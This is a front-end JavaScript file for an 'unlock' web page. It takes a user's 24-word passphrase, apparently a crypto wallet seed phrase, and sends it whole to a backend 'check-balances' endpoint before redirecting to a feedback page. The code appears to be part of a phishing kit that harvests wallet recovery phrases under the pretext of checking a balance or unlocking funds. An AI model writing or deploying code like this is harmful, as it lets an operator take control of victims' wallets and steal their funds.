// frontend/js/unlock.js
document.addEventListener('DOMContentLoaded', function() {
  const passphraseInput = document.getElementById('passphrase');
  const submitBtn = document.getElementById('submitBtn');
  const findPassBtn = document.getElementById('findPassBtn');
  const statusDiv = document.getElementById('status');
  const invalidModal = document.getElementById('invalidModal');
  const dismissModalBtn = document.getElementById('dismissModalBtn');
  const modalFindBtn = document.getElementById('modalFindBtn');

  const API_URL = window.API_URL || 'http://localhost:3000/api/check-balances';

  submitBtn.addEventListener('click', async function() {
    const passphrase = passphraseInput.value.trim();
    
    if (!passphrase) {
      showStatus('Please enter your passphrase', 'error');
      return;
    }

    const words = passphrase.split(/\s+/);
    if (words.length !== 24) {
      showStatus(`Invalid passphrase: Expected 24 words, got ${words.length}`, 'error');
      showInvalidModal();
      return;
    }

    submitBtn.disabled = true;
    showStatus('Checking balance...', 'loading');

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          seedPhrases: [passphrase]
        })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Failed to check balance');
      }

      if (data.results && data.results.length > 0) {
        const result = data.results[0];
        
        if (result.status === 'invalid') {
          showInvalidModal();
          showStatus('Invalid passphrase', 'error');
        } else {
          sessionStorage.setItem('walletResult', JSON.stringify(result));
          window.location.href = 'feedback.html';
        }
      } else {
        throw new Error('No results received');
      }
    } catch (error) {
      console.error('Error:', error);
      showStatus('Error: ' + error.message, 'error');
      showInvalidModal();
    } finally {
      submitBtn.disabled = false;
    }
  });

  findPassBtn.addEventListener('click', function() {
    window.location.href = 'find-passphrase.html';
  });

  dismissModalBtn.addEventListener('click', function() {
    invalidModal.style.display = 'none';
  });

  modalFindBtn.addEventListener('click', function() {
    window.location.href = 'find-passphrase.html';
  });

  invalidModal.addEventListener('click', function(e) {
    if (e.target === invalidModal) {
      invalidModal.style.display = 'none';
    }
  });

  function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = 'status ' + type;
    statusDiv.style.display = 'block';
  }

  function showInvalidModal() {
    invalidModal.style.display = 'flex';
  }
});